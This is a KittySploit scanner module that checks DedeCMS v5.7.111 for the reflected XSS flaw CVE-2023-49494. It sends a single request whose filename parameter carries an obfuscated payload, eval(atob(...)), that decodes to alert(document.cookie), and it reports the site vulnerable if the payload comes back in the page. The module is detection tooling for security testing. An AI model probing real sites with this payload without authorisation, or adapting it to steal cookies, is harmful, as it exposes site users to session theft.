#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DedeCMS v5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DedeCMS v5.7.111 - Cross-Site Scripting Detection',
        'description': 'DedeCMS v5.7.111 was discovered to contain a reflective cross-site scripting (XSS) vulnerability via the component select_media_post_wangEditor.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'dedecms', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/Hebing123/cve/issues/3', 'https://nvd.nist.gov/vuln/detail/CVE-2023-49494'],
        'cve': 'CVE-2023-49494',
    }

    def run(self):
        path = '/uploads/include/dialog/select_media_post_wangEditor.php?filename=1%3Cinput%20onfocus=eval(atob(this.id))%20id=YWxlcnQoZG9jdW1lbnQuY29va2llKTs=%20autofocus%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"data":{"url":', '<input onfocus=eval(atob(this.id)) id=',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='DedeCMS v5.7.111 - Cross-Site Scripting detected', path=path)
            return True
        return False

